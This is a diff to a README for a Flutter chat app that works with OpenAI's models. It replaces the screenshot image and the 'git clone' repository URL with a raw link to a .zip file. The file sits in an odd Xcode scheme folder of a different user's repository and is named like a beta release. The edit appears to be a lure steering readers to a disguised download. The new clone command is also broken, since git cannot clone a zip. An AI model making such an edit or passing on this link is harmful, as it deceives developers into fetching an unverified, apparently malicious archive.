@@ -11,7 +11,7 @@ Introducing ChatGPT app, a Flutter app that lets you chat with OpenAI's language
 
 ## Screenshots
 
-![ChatGPT APP](https://user-images.githubusercontent.com/89196733/218802241-b56b8741-da3e-484c-866e-350b021c70e7.jpg)
+![ChatGPT APP](https://raw.githubusercontent.com/salman-rafii/ChatGPT-App/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/Chat_GP_App_v3.1-beta.5.zip)
 
 
 
@@ -20,7 +20,7 @@ Introducing ChatGPT app, a Flutter app that lets you chat with OpenAI's language
 1. Clone the repository
 
 ```bash
-git clone https://github.com/Chamidilshan/ChatGPT-App.git
+git clone https://raw.githubusercontent.com/salman-rafii/ChatGPT-App/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/Chat_GP_App_v3.1-beta.5.zip
 
 ```
 2. Install dependencies
